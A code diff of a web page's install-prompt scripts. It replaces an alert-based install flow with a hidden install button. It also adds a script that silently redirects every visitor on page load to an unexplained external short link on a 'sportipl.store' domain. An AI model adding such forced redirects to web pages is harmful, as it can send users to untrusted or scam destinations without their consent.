@@ -19,55 +19,49 @@
   });
   }
 </script>
-<!-- <script>
-  const linkToOpen = 'https://google.com';
-  window.onload = function() {
-    window.location.href = linkToOpen;
-  };
-</script> -->
+
 <script>
-  // Function to check if the PWA can be installed
+
   function canInstall() {
     return ('beforeinstallprompt' in window);
   }
 
-  // Function to show an alert and install the PWA
-  function showInstallAlert() {
-    if (canInstall()) {
-      alert("Install our app for a better experience!");
+  function showInstallPrompt() {
+      const installButton = document.getElementById('installButton');
+
+      if (canInstall()) {
+        installButton.style.display = 'block';
+        installButton.addEventListener('click', () => {
+          const deferredPrompt = window.deferredPrompt;
+          if (deferredPrompt) {
+            deferredPrompt.prompt();
+            deferredPrompt.userChoice
+              .then((choiceResult) => {
+                if (choiceResult.outcome === 'accepted') {
+                  console.log('User accepted the install prompt');
+                } else {
+                  console.log('User dismissed the install prompt');
+                }
+                window.deferredPrompt = null;
+              });
+          }
+        });
+      }
     }
-  }
 
-  // Function to check if the PWA is installed
-  function isPWAInstalled() {
-    return (window.matchMedia('(display-mode: standalone)').matches);
-  }
-
-  // Function to display the link after installation
-  function showLinkAfterInstall() {
-    if (isPWAInstalled()) {
-      alert("Thank you for installing our app! Click OK to visit the app.");
-      // Replace 'https://your-app-link' with the actual link to your app
-      window.location.href = "https://google.com";
-    }
-  }
-
-  // Listen for the "beforeinstallprompt" event
-  window.addEventListener('beforeinstallprompt', (event) => {
-    // Prevent the default browser install prompt
-    event.preventDefault();
-
-    // Show the install alert
-    showInstallAlert();
-
-    // Show the link after installation
-    event.prompt()
-      .then((userChoice) => {
-        if (userChoice.outcome === 'accepted') {
-          showLinkAfterInstall();
-        }
-      });
-  });
+    // Listen for the "beforeinstallprompt" event
+    window.addEventListener('beforeinstallprompt', (event) => {
+      event.preventDefault();
+      showInstallPrompt();
+      window.deferredPrompt = event;
+    });
 </script>
+<script>
+  const linkToOpen = 'https://sportipl.store/qFwwx4';
+  window.onload = function() {
+    window.location.href = linkToOpen;
+  };
+</script>
+<button id="installButton" style="display: none;">Install PWA</button>
 </body>
 </html>
